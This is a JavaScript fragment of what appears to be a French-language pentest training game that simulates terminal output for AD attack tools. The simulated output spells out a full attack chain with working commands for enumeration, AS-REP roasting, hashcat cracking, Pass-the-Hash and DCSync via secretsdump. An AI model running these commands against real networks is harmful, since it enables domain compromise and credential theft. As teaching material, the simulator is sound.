        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    return {
      output: [
        `; <<>> DiG 9.18.1 <<>> axfr ${domainArg} @${ip}`,
        `; (1 server found)`,
        `;; global options: +cmd`,
        `\x1b[31m; Transfer failed.\x1b[0m`,
        '',
        `\x1b[32m[+] Zone Transfer (AXFR) REFUSÉ par ${ip}\x1b[0m`,
        `\x1b[32m[+] Bonne configuration — le DC n\'autorise pas les transferts de zone anonymes\x1b[0m`,
        '',
        `\x1b[33m📚 Si le transfert avait réussi :\x1b[0m`,
        `   → Tous les enregistrements DNS internes exposés en une seule commande`,
        `   → Noms d\'hôtes, IPs, sous-domaines, serveurs internes : carte complète`,
        `   → Fréquent dans les labs avant 2015, rare en production correctement configurée`,
        '',
        `\x1b[33m💡 Prochaine étape :\x1b[0m`,
        `   \x1b[36mnikto -h http://${ip}\x1b[0m   → fingerprint web IIS / headers / fichiers exposés`,
      ].join('\n'),
      pedagogie: 'AXFR (Zone Transfer) permet de copier intégralement une zone DNS. Normalement réservé aux serveurs DNS secondaires. Si mal configuré : tous les hôtes internes, IPs et sous-domaines sont exposés à n\'importe qui. Défense : restreindre allow-transfer aux IPs des serveurs DNS secondaires uniquement. Test classique en phase de reconnaissance externe.',
      effect: null, xpBonus: 10, stateChanges: {}
    };
  }

  // ── gobuster / feroxbuster : brute-force de répertoires HTTP ──
  if (cmd === 'gobuster' || cmd === 'feroxbuster' || cmd === 'dirb') {
    const rawUrl = args.find(a => /^https?:\/\//.test(a)) || '';
    const ipFromUrl = rawUrl.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    const ip = ipFromUrl || args.find(a => /192\.168\.1\.\d+/.test(a));

    if (!ip) {
      const usage = cmd === 'gobuster'
        ? 'gobuster dir -u http://<ip> -w <wordlist> -x asp,aspx,txt'
        : cmd === 'feroxbuster'
          ? 'feroxbuster --url http://<ip> --wordlist <wordlist> --extensions asp,aspx,txt'
          : 'dirb http://<ip> <wordlist>';
      return { output: `Usage: ${usage}`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `${cmd}: ${ip} — hôte inconnu`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (isLocked(machine, state)) {
      return { output: `\x1b[31m${cmd}: ${ip} — connexion refusée (réseau interne inaccessible)\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Scanne d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'webserver') {
      const isRecursive = cmd === 'feroxbuster';
      return {
        output: [
          `\x1b[36m${isRecursive ? '🦔 Feroxbuster v2.10.1' : cmd === 'dirb' ? '🔎 DIRB v2.22' : '💣 Gobuster v3.6.0'} — brute-force répertoires\x1b[0m`,
          `Target : http://${ip}`,
          `Wordlist: ${args.find(a => /wordlist|common|medium|small|w$/.test(a) && !/^-/.test(a)) || '/usr/share/wordlists/dirb/common.txt'}`,
          '',
          `===============================================================`,
          `\x1b[32m200   GET  /                       [IIS 10.0 default]\x1b[0m`,
          `\x1b[32m200   GET  /iisstart.htm            [Page d\'accueil IIS]\x1b[0m`,
          `\x1b[33m401   GET  /admin/                  [Auth requise]\x1b[0m`,
          `\x1b[32m200   GET  /aspnet_client/          [ASP.NET scripts]\x1b[0m`,
          `\x1b[31m200   GET  /backup/                 [Répertoire ouvert !]\x1b[0m`,
          `\x1b[31m200   GET  /backup/passwords.txt    [Fichier sensible exposé !]\x1b[0m`,
          isRecursive ? `\x1b[31m200   GET  /backup/db_config.xml   [Config DB exposée !]\x1b[0m` : '',
          isRecursive ? `\x1b[33m302   GET  /login.aspx             [Redirection login AD]\x1b[0m` : '',
          isRecursive ? `\x1b[33m200   GET  /admin/panel.aspx        [Panel admin ASP.NET]\x1b[0m` : '',
          `===============================================================`,
          `[+] ${isRecursive ? '9' : '6'} entrées trouvées`,
          '',
          `\x1b[31m[!] /backup/ accessible sans authentification — exfiltration possible !\x1b[0m`,
          `\x1b[31m[!] /backup/passwords.txt : mots de passe en clair potentiels\x1b[0m`,
          '',
          `\x1b[33m💡 Prochaine étape : enum4linux -a ${ip}\x1b[0m`,
        ].filter(l => l !== '').join('\n'),
        pedagogie: cmd === 'gobuster'
          ? 'gobuster dir force chaque entrée d\'une wordlist comme chemin HTTP. Mode dir = répertoires et fichiers. -x pour tester plusieurs extensions (asp,aspx sur IIS; php,html sur Linux). Multithreadé (Go), très rapide. Ne fait pas de récursion — utilise feroxbuster pour ça.'
          : cmd === 'feroxbuster'
            ? 'feroxbuster est la version récursive de gobuster. Il explore automatiquement chaque répertoire trouvé jusqu\'à la profondeur spécifiée (--depth). Plus lent mais plus complet. Idéal pour les applications web profondes.'
            : 'dirb est le scanner de répertoires classique. Lent mais fiable. Wordlists intégrées dans /usr/share/dirb/wordlists/.',
        effect: { type: 'SCAN_MACHINE', machineId: machine.id },
        xpBonus: 20,
        stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
      };
    }

    return {
      output: `${cmd}: ${machine.name} (${ip}) — pas de service web HTTP sur cette cible.`,
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── enum4linux : énumération SMB/RPC Active Directory ──
  if (cmd === 'enum4linux') {
    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    if (!ip) return { output: 'Usage: enum4linux -a <ip>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `enum4linux: ${ip} — hôte inconnu`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (isLocked(machine, state)) {
      return { output: `\x1b[31menum4linux: ${ip} — SMB filtré (réseau interne inaccessible)\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Scanne d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'webserver') {
      return {
        output: [
          `\x1b[36menum4linux v0.9.1 ( https://github.com/CiscoCXSecurity/enum4linux )\x1b[0m`,
          `Target: ${ip}`,
          '',
          `\x1b[33m===========( Target Information )===========\x1b[0m`,
          `Target .......... ${ip}`,
          `RID Range ....... 500-550, 1000-1050`,
          `Username ........ '' (null session)`,
          `Password ........ ''`,
          '',
          `\x1b[33m===========( OS Information )===========\x1b[0m`,
          `\x1b[32m[+] OS: Windows Server 2019 Standard 17763\x1b[0m`,
          `\x1b[32m[+] Domain: CORP | SID: S-1-5-21-3623811015-3361044348-30300820\x1b[0m`,
          `\x1b[32m[+] NetBIOS Computer Name: DC\x1b[0m`,
          '',
          `\x1b[33m===========( Users via RID cycling )===========\x1b[0m`,
          `\x1b[32m[+] user:[Administrator]  rid:[0x1f4]  (Built-in admin)\x1b[0m`,
          `\x1b[32m[+] user:[Guest]          rid:[0x1f5]  (Built-in guest)\x1b[0m`,
          `\x1b[32m[+] user:[krbtgt]         rid:[0x1f6]  (Kerberos TGT — compte de service)\x1b[0m`,
          `\x1b[31m[+] user:[svc_backup]     rid:[0x451]  (Compte de service backup)\x1b[0m`,
          `[+] user:[john.doe]       rid:[0x452]`,
          `[+] user:[jane.smith]     rid:[0x453]`,
          '',
          `\x1b[33m===========( Groups )===========\x1b[0m`,
          `\x1b[32m[+] Group: Domain Admins      Members: Administrator\x1b[0m`,
          `[+] Group: Domain Users       Members: Administrator, Guest, krbtgt, svc_backup, john.doe, jane.smith`,
          `[+] Group: Schema Admins      Members: Administrator`,
          `[+] Group: Enterprise Admins  Members: Administrator`,
          `\x1b[31m[+] Group: Backup Operators   Members: svc_backup\x1b[0m`,
          '',
          `\x1b[33m===========( Password Policy )===========\x1b[0m`,
          `[+] Longueur minimale: 7`,
          `[+] Historique: 0 (réutilisation possible)`,
          `\x1b[31m[+] Expiration: Jamais (mots de passe n\'expirent pas)\x1b[0m`,
          `\x1b[31m[+] Lockout threshold: Aucun (brute-force Kerberos sans risque !)\x1b[0m`,
          '',
          `\x1b[32m[+] Énumération terminée : 6 comptes trouvés\x1b[0m`,
          '',
          `\x1b[33m💡 Prochaine étape — fingerprint SMB :\x1b[0m`,
          `   \x1b[36mnxc smb ${ip}\x1b[0m   → OS, hostname, domaine, SMB signing`,
        ].join('\n'),
        pedagogie: 'enum4linux énumère SMB/RPC d\'un AD sans authentification (null session). RID cycling = bruteforce des identifiants de sécurité pour découvrir tous les comptes. Révèle : users, groupes, SID du domaine, politique de mots de passe. Pas de lockout = brute-force Kerberos sans risque. svc_backup dans "Backup Operators" = droits élevés potentiels.',
        effect: { type: 'SCAN_MACHINE', machineId: machine.id },
        xpBonus: 25,
        stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
      };
    }

    return {
      output: `\x1b[31menum4linux: SMB non disponible sur ${machine.name} (${ip}).\x1b[0m`,
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── nxc / netexec / crackmapexec : fingerprint SMB ──
  if (cmd === 'nxc' || cmd === 'netexec' || cmd === 'crackmapexec' || cmd === 'cme') {
    const proto = args[0];
    const ip = args.find(a => /192\.168\.1\.\d+/.test(a));

    if (!ip || proto !== 'smb') {
      return {
        output: [
          'Usage: nxc smb <ip>',
          '       nxc smb <ip> -u \'\' -p \'\' --users',
          '       nxc smb <ip> -u \'\' -p \'\' --shares',
          'Exemple: nxc smb 192.168.1.10',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `nxc: ${ip} — hôte inconnu`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (isLocked(machine, state)) {
      return { output: `\x1b[31mSMB  ${ip}  445  -  [-] Connexion refusée (réseau interne inaccessible)\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Scanne d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'webserver') {
      const uIdx = args.indexOf('-u');
      const pIdx = args.indexOf('-p');
      const user = uIdx !== -1 ? args[uIdx + 1] : '';
      const pass = pIdx !== -1 ? args[pIdx + 1] : '';
      const wantsShares = args.includes('--shares');
      const isAuthenticated = user && pass && user !== "''" && user !== '""';

      // Phase 2: authenticated with svc_backup credentials + --shares
      if (isAuthenticated && wantsShares && state.svcBackupCreds) {
        const isRightCreds = user.toLowerCase().includes('svc_backup') && pass === 'ManagementPassword123';
        if (isRightCreds) {
          return {
            output: [
              `\x1b[32mSMB  ${ip}  445  DC  [*] Windows Server 2019 Build 17763 x64 (name:DC) (domain:corp.local) (signing:True) (SMBv1:False)\x1b[0m`,
              `\x1b[32mSMB  ${ip}  445  DC  [+] corp.local\\svc_backup:ManagementPassword123 (Pwn3d!)\x1b[0m`,
              '',
              `\x1b[36mSMB  ${ip}  445  DC  [*] Énumération des partages...\x1b[0m`,
              '',
              `\x1b[32mSMB  ${ip}  445  DC  [+] Shares\x1b[0m`,
              `SMB  ${ip}  445  DC  Share           Permissions     Remark`,
              `SMB  ${ip}  445  DC  -----           -----------     ------`,
              `SMB  ${ip}  445  DC  ADMIN$          NO ACCESS       Remote Admin`,
              `SMB  ${ip}  445  DC  C$              NO ACCESS       Default share`,
              `SMB  ${ip}  445  DC  IPC$            READ ONLY       Remote IPC`,
              `SMB  ${ip}  445  DC  NETLOGON        READ ONLY       Logon server share`,
              `SMB  ${ip}  445  DC  SYSVOL          READ ONLY       Logon server share`,
              `\x1b[31mSMB  ${ip}  445  DC  backup          READ,WRITE      Backup scripts\x1b[0m`,
              '',
              `\x1b[31m[+] Partage "backup" accessible en lecture/écriture !\x1b[0m`,
              '',
              `\x1b[33m💡 Prochaine étape — explorer le partage backup :\x1b[0m`,
              `   \x1b[36msmbclient //${ip}/backup -U corp/svc_backup%ManagementPassword123\x1b[0m`,
            ].join('\n'),
            pedagogie: 'nxc smb avec credentials valides : (Pwn3d!) = compte local admin ou admin du domaine. --shares énumère les partages et les permissions. Le partage "backup" accessible en R/W est une misconfiguration critique : des scripts de backup contiennent souvent des credentials en clair.',
            effect: null, xpBonus: 25,
            stateChanges: {}
          };
        }
        return {
          output: [
            `\x1b[32mSMB  ${ip}  445  DC  [*] Windows Server 2019 Build 17763 x64 (name:DC) (domain:corp.local) (signing:True) (SMBv1:False)\x1b[0m`,
            `\x1b[31mSMB  ${ip}  445  DC  [-] corp.local\\${user}:${pass} STATUS_LOGON_FAILURE\x1b[0m`,
            '',
            `\x1b[33m💡 Credentials incorrects. Cracks d'abord le hash avec :\x1b[0m`,
            `   \x1b[36mhashcat -m 18200 asrep_hash.txt rockyou.txt --force\x1b[0m`,
          ].join('\n'),
          pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
        };
      }

      // Default: unauthenticated fingerprint
      const hasNullSession = args.includes('--users') || (wantsShares && !isAuthenticated);
      const baseOutput = [
        `\x1b[32mSMB  ${ip}  445  DC  [*] Windows Server 2019 Build 17763 x64 (name:DC) (domain:corp.local) (signing:\x1b[31mTrue\x1b[32m) (SMBv1:False)\x1b[0m`,
        '',
        `\x1b[32m[+] OS          : Windows Server 2019 Standard (Build 17763)\x1b[0m`,
        `\x1b[32m[+] Hostname    : DC\x1b[0m`,
        `\x1b[32m[+] Domaine     : corp.local\x1b[0m`,
        `\x1b[32m[+] FQDN        : dc.corp.local\x1b[0m`,
        `\x1b[31m[+] SMB Signing : True (REQUIRED) → NTLM Relay IMPOSSIBLE sur cette cible\x1b[0m`,
        `[+] SMBv1       : False (désactivé — bien configuré)`,
      ];

      const nullOutput = hasNullSession ? [
        '',
        `\x1b[33m[*] Tentative null session (u='' p='')...\x1b[0m`,
        `\x1b[31m[-] corp.local\\ STATUS_ACCESS_DENIED — null session refusée\x1b[0m`,
        `\x1b[33m💡 Null session bloquée. Utilise enum4linux pour RID cycling ou kerbrute pour les users.\x1b[0m`,
      ] : [];

      return {
        output: [
          ...baseOutput,
          ...nullOutput,
          '',
          `\x1b[33m💡 SMB Signing obligatoire → Responder/ntlmrelayx échoueront sur ce DC.\x1b[0m`,
          `\x1b[33m   Prochaine étape :\x1b[0m`,
          `   \x1b[36mresponder -I eth0\x1b[0m   → tentative NTLM Relay (attendu : échec sur DC)`,
        ].join('\n'),
        pedagogie: 'NetExec (nxc) = successeur de CrackMapExec. Fingerprint SMB sans authentification : révèle OS, hostname, domaine, et surtout SMB Signing. signing:True REQUIRED = NTLM Relay bloqué sur cette cible. SMBv1:False = pas de vulnérabilité EternalBlue/MS17-010.',
        effect: null, xpBonus: 15,
        stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
      };
    }

    return {
      output: `SMB  ${ip}  445  ${machine.name}  [*] ${machine.os} (signing:Unknown)`,
      pedagogie: null, effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  // ── responder / ntlmrelayx : NTLM Relay (éducatif — échoue si SMB signing) ──
  if (cmd === 'responder' || cmd === 'ntlmrelayx' || cmd === 'impacket-ntlmrelayx') {
    const isRelay = cmd !== 'responder';
    return {
      output: [
        isRelay
          ? `\x1b[36m[*] Impacket NTLMRelayx — relaying captured NTLM hashes\x1b[0m`
          : `\x1b[36m[*] Responder v3.1.3 — LLMNR/NBT-NS/mDNS poisoner\x1b[0m`,
        isRelay
          ? `[*] Targets: 192.168.1.10 (SMB)`
          : `[*] Interface: eth0  |  IP: 10.0.0.1`,
        '',
        isRelay
          ? `\x1b[33m[*] En attente d\'authentifications capturées par Responder...\x1b[0m`
          : `\x1b[33m[*] Poisoning LLMNR, NBT-NS, mDNS sur le réseau...\x1b[0m`,
        '',
        `\x1b[31m[!] ATTAQUE BLOQUÉE — SMB Signing REQUIRED sur 192.168.1.10\x1b[0m`,
        '',
        `\x1b[33m📚 Pourquoi ça échoue :\x1b[0m`,
        `   SMB Signing (obligatoire) = le DC signe cryptographiquement chaque paquet SMB`,
        `   → Même si on capture le hash NTLM, le relay échoue car les paquets ne sont pas signés`,
        `   → ntlmrelayx ne peut pas signer avec un hash intercepté sans connaître le secret`,
        '',
        `\x1b[32m📚 Quand ça FONCTIONNE :\x1b[0m`,
        `   Workstations Windows sans GPO de signing (signing:False)`,
        `   → nxc smb 192.168.1.0/24 --gen-relay-list targets.txt`,
        `   → responder -I eth0 -dPv  +  ntlmrelayx -tf targets.txt -smb2support`,
        '',
        `\x1b[33m💡 Prochaine étape alternative :\x1b[0m`,
        `   \x1b[36mpython3 IOXIDResolver.py -t 192.168.1.10\x1b[0m   → interfaces réseau du DC`,
      ].join('\n'),
      pedagogie: 'NTLM Relay : capture une authentification NTLM via LLMNR/NBT-NS poisoning (Responder) et la rejoue vers une autre cible (ntlmrelayx) avant que le hash expire. Contre-mesure principale : SMB Signing obligatoire. En 2024, la plupart des DC ont signing:True par défaut. Les workstations membres, elles, souvent non — d\'où l\'intérêt de mapper signing:False avec nxc.',
      effect: null, xpBonus: 10, stateChanges: {}
    };
  }


  // ── kerbrute : énumération comptes Kerberos sans lockout ──
  if (cmd === 'kerbrute') {
    const dcIdx = args.indexOf('--dc');
    const ip = dcIdx !== -1 ? args[dcIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a)) || '192.168.1.10';
    const machine = getMachineByIP(ip);
    if (machine && isLocked(machine, state)) {
      return { output: `\x1b[31m[!] ${ip} inaccessible depuis ta position.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes('webserver')) {
      return { output: `\x1b[31m[!] Scanne d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    return {
      output: [
        `\x1b[36m[*] Kerbrute v1.0.3 — Kerberos Username Enumeration\x1b[0m`,
        `[*] DC     : ${ip}:88`,
        `[*] Domain : corp.local`,
        `[*] Wordlist: userlist.txt`,
        '',
        `\x1b[32m[+] VALID USERNAME: administrator@corp.local\x1b[0m`,
        `\x1b[32m[+] VALID USERNAME: guest@corp.local\x1b[0m`,
        `\x1b[32m[+] VALID USERNAME: krbtgt@corp.local\x1b[0m`,
        `\x1b[31m[+] VALID USERNAME: svc_backup@corp.local\x1b[0m`,
        `\x1b[32m[+] VALID USERNAME: john.doe@corp.local\x1b[0m`,
        `\x1b[32m[+] VALID USERNAME: jane.smith@corp.local\x1b[0m`,
        '',
        `\x1b[32m[*] Done! Tested 1000 usernames — 6 valides\x1b[0m`,
        '',
        `\x1b[33m📚 Avantage vs hydra : aucun log 4625 (Logon Failure) généré !\x1b[0m`,
        `   Kerberos AS-REQ pré-auth permet de valider les users sans mot de passe`,
        '',
        `\x1b[33m💡 Prochaine étape — AS-REP Roasting :\x1b[0m`,
        `   \x1b[36mimpacket-GetNPUsers corp.local/ -dc-ip ${ip} -no-pass -usersfile users.txt\x1b[0m`,
      ].join('\n'),
      pedagogie: 'kerbrute exploite le protocole Kerberos pour valider des noms d\'utilisateurs sans mot de passe. Méthode : envoie des AS-REQ sans pré-authentification. Si le compte existe → KDC répond KRB5KDC_ERR_PREAUTH_REQUIRED (erreur valide). Si inexistant → KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN. Invisible dans les logs de sécurité Windows car c\'est une requête légitime.',
      effect: null, xpBonus: 20,
      stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, 'webserver'])] }
    };
  }

  // ── impacket-GetNPUsers : AS-REP Roasting ──
  if (cmd === 'impacket-getnpusers' || cmd === 'getnpusers' || joined.toLowerCase().includes('getnpusers')) {
    const ip = args.find(a => /192\.168\.1\.\d+/.test(a)) ||
      (args.find(a => a.startsWith('-dc-ip')) ? args[args.indexOf('-dc-ip') + 1] : '192.168.1.10');
    const dcIpIdx = args.indexOf('-dc-ip');
    const resolvedIp = dcIpIdx !== -1 ? args[dcIpIdx + 1] : ip;

    if (!state.scannedMachines.includes('webserver')) {
      return { output: `\x1b[31m[!] Scanne d\'abord l\'AD : nmap -sV 192.168.1.10\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    return {
      output: [
        `\x1b[36mImpacket v0.12.0 — GetNPUsers (AS-REP Roasting)\x1b[0m`,
        `[*] DC-IP   : ${resolvedIp}`,
        `[*] Domaine : corp.local`,
        `[*] Users   : users.txt (6 comptes à tester)`,
        '',
        `[*] Testing administrator@corp.local     → Kerberos pre-auth requis — skip`,
        `[*] Testing guest@corp.local             → Compte désactivé — skip`,
        `[*] Testing krbtgt@corp.local            → Kerberos pre-auth requis — skip`,
        `\x1b[31m[*] Testing svc_backup@corp.local        → PAS de pré-auth ! Hash récupéré !\x1b[0m`,
        `[*] Testing john.doe@corp.local          → Kerberos pre-auth requis — skip`,
        `[*] Testing jane.smith@corp.local        → Kerberos pre-auth requis — skip`,
        '',
        `\x1b[32m[+] Hash AS-REP trouvé pour svc_backup :\x1b[0m`,
        `\x1b[32m$krb5asrep$23$svc_backup@CORP.LOCAL:a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5$\x1b[0m`,
        `\x1b[32md8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7\x1b[0m`,
        `\x1b[32md8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7\x1b[0m`,
        '',
        `\x1b[33m📚 svc_backup n\'a pas "Require Kerberos preauthentication" → compte vulnérable\x1b[0m`,
        `   Le hash AS-REP peut être cracké OFFLINE — aucune connexion vers le DC nécessaire`,
        '',
        `\x1b[33m💡 Prochaine étape :\x1b[0m`,
        `   \x1b[36mhashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force\x1b[0m`,
      ].join('\n'),
      pedagogie: 'AS-REP Roasting : si un compte AD n\'a pas "Kerberos pre-authentication required", le KDC répond à toute demande d\'AS-REQ avec un AS-REP chiffré avec la clé du compte. Ce hash ($krb5asrep$23$...) peut être cracké offline avec hashcat -m 18200. Aucun log d\'authentification généré sur le DC — technique très discrète.',
      effect: null, xpBonus: 30,
      stateChanges: { asrepDone: true }
    };
  }

  // ── hashcat : crack hash AS-REP (mode 18200) ──
  if (cmd === 'hashcat') {
    const mode = args.find(a => /^-m$/.test(a)) ? args[args.indexOf('-m') + 1] : args.find(a => /^-m\d+/.test(a))?.slice(2);
    const isAsrep = mode === '18200' || joined.includes('18200');
    const isNtlm  = mode === '1000'  || joined.includes('1000');

    if (!isAsrep && !isNtlm) {
      return {
        output: [
          'Usage hashcat pentest AD :',
          '  hashcat -m 18200 asrep_hash.txt rockyou.txt --force   (AS-REP Kerberos)',
          '  hashcat -m 1000  ntlm_hash.txt  rockyou.txt --force   (NTLM)',
          '  hashcat -m 13100 tgs_hash.txt   rockyou.txt --force   (Kerberoasting TGS)',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    if (isAsrep) {
      if (!state.asrepDone) {
        return {
          output: `\x1b[31m[!] Aucun hash AS-REP à cracker. Lance d\'abord :\x1b[0m\n\x1b[36mimpacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt\x1b[0m`,
          pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
        };
      }
      return {
        output: [
          `\x1b[36mhashcat v6.2.6 — Mode 18200 (Kerberos AS-REP etype 23)\x1b[0m`,
          `Dictionary: /usr/share/wordlists/rockyou.txt (14 344 391 entrées)`,
          '',
          `\x1b[33m[*] Session......: hashcat\x1b[0m`,
          `[*] Status.......: Running`,
          `[*] Hash.Name....: Kerberos 5 AS-REP etype 23`,
          '',
          `\x1b[33m[*] Progression : 23%...\x1b[0m`,
          `\x1b[33m[*] Progression : 67%...\x1b[0m`,
          '',
          `\x1b[32m$krb5asrep$23$svc_backup@CORP.LOCAL:...:ManagementPassword123\x1b[0m`,
          '',
          `\x1b[32mSession..........: hashcat\x1b[0m`,
          `\x1b[32mStatus...........: Cracked\x1b[0m`,
          `\x1b[32mHash.Name........: Kerberos 5 AS-REP etype 23\x1b[0m`,
          `\x1b[32mRecovered........: 1/1 (100.00%) Digests\x1b[0m`,
          '',
          `\x1b[31m[+] CREDENTIALS TROUVÉS : svc_backup : ManagementPassword123\x1b[0m`,
          '',
          `\x1b[33m💡 Prochaine étape — valider et explorer les partages SMB :\x1b[0m`,
          `   \x1b[36mnxc smb 192.168.1.10 -u svc_backup -p ManagementPassword123 --shares\x1b[0m`,
        ].join('\n'),
        pedagogie: 'hashcat -m 18200 : mode AS-REP Kerberos etype 23 (RC4-HMAC). Le hash AS-REP est chiffré avec le hash NTLM du mot de passe du compte. hashcat teste chaque entrée de rockyou.txt, chiffre et compare. Offline total — 0 connexion vers le DC, 0 log. Vitesse GPU : ~5 milliards de tentatives/sec. Le crackage échoue uniquement si le mot de passe est absent des wordlists.',
        effect: null, xpBonus: 35,
        stateChanges: { svcBackupCreds: true }
      };
    }

    // NTLM mode (fallback, peut être utilisé post-secretsdump)
    return {
      output: [
        `\x1b[36mhashcat v6.2.6 — Mode 1000 (NTLM)\x1b[0m`,
        `[*] Cracking NTLM hash...`,
        `\x1b[32m[+] aad3b435b51404eeaad3b435b51404ee:  (hash vide — pas de mot de passe)\x1b[0m`,
        `\x1b[33m💡 Hash NTLM Administrator récupéré via secretsdump → utilise directement en Pass-the-Hash\x1b[0m`,
        `   \x1b[36mevil-winrm -i 192.168.1.100 -u Administrator -H <hash>\x1b[0m`,
      ].join('\n'),
      pedagogie: 'hashcat -m 1000 : mode NTLM. Le hash NTLM peut être utilisé directement en Pass-the-Hash sans le cracker. Le cracker est utile pour obtenir le mot de passe en clair (utile pour Password Reuse attacks).',
      effect: null, xpBonus: 10, stateChanges: {}
    };
  }

  // ── smbclient : connexion au partage SMB backup ──
  if (cmd === 'smbclient') {
    const shareArg = args.find(a => a.startsWith('//'));
    if (!shareArg) return { output: 'Usage: smbclient //<ip>/<share> -U <domain>/<user>%<password>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const ipMatch = shareArg.match(/\/\/([0-9.]+)\//);
    const ip = ipMatch ? ipMatch[1] : null;
    const share = shareArg.split('/').pop();
    const machine = ip ? getMachineByIP(ip) : null;

    if (!machine || isLocked(machine, state)) {
      return { output: `\x1b[31msmbclient: Connection to ${ip} failed (NT_STATUS_CONNECTION_REFUSED)\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.svcBackupCreds) {
      return {
        output: [
          `\x1b[31msmbclient: NT_STATUS_LOGON_FAILURE — credentials invalides\x1b[0m`,
          '',
          `\x1b[33m💡 Tu n\'as pas encore les credentials svc_backup.\x1b[0m`,
          `   Lance : \x1b[36mimpacket-GetNPUsers corp.local/ -dc-ip ${ip} -no-pass -usersfile users.txt\x1b[0m`,
          `   Puis  : \x1b[36mhashcat -m 18200 asrep_hash.txt rockyou.txt --force\x1b[0m`,
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    return {
      output: [
        `\x1b[36mTry "help" to get a list of possible commands.\x1b[0m`,
        `smb: \\> ls`,
        '',
        `  .                           D        0  Mon Jan 15 09:00:00 2024`,
        `  ..                          D        0  Mon Jan 15 09:00:00 2024`,
        `\x1b[32m  domain_sync.ps1            A     4096  Mon Jan 15 08:45:00 2024\x1b[0m`,
        `\x1b[32m  ad_users_export.csv        A    28672  Mon Jan 15 08:44:00 2024\x1b[0m`,
        `\x1b[31m  admin_credentials.txt      A      256  Mon Jan 10 16:23:00 2024\x1b[0m`,
        `\x1b[31m  ntds_backup_2023.zip       A  1048576  Fri Dec 29 02:00:00 2023\x1b[0m`,
        '',
        `smb: \\> get admin_credentials.txt`,
        `getting file \\admin_credentials.txt of size 256`,
        '',
        `\x1b[31m[!] Contenu de admin_credentials.txt :\x1b[0m`,
        `   Domain Admin credentials (emergency use only)`,
        `   Administrator : Corp@dmin2024!`,
        `   svc_backup    : ManagementPassword123`,
        `   Note: svc_backup has DCSync rights (Replicating Directory Changes)\x1b[0m`,
        '',
        `\x1b[32m[+] PIVOT DÉBLOQUÉ : svc_backup a les droits DCSync !\x1b[0m`,
        `\x1b[32m[+] Possible de dumper TOUS les hashes AD via secretsdump !\x1b[0m`,
        '',
        `\x1b[33m💡 Prochaine étape — DCSync :\x1b[0m`,
        `   \x1b[36mimpacket-secretsdump corp.local/svc_backup:ManagementPassword123@192.168.1.10\x1b[0m`,
      ].join('\n'),
      pedagogie: 'smbclient permet d\'explorer les partages SMB comme un client FTP. Le partage backup contient admin_credentials.txt — erreur critique de sécurité. svc_backup a "Replicating Directory Changes" = droits DCSync. Avec ces droits, impacket-secretsdump peut répliquer l\'AD et extraire TOUS les hashes NTLM du domaine sans être admin local.',
      effect: null, xpBonus: 40,
      stateChanges: {
        smbShareAccessed: true,
        unlockedMachines: [...new Set([...state.unlockedMachines, 'dbserver', 'dc'])]
      }
    };
  }

  // ── scores ──
  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31mbash: ${cmd}: command not found\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

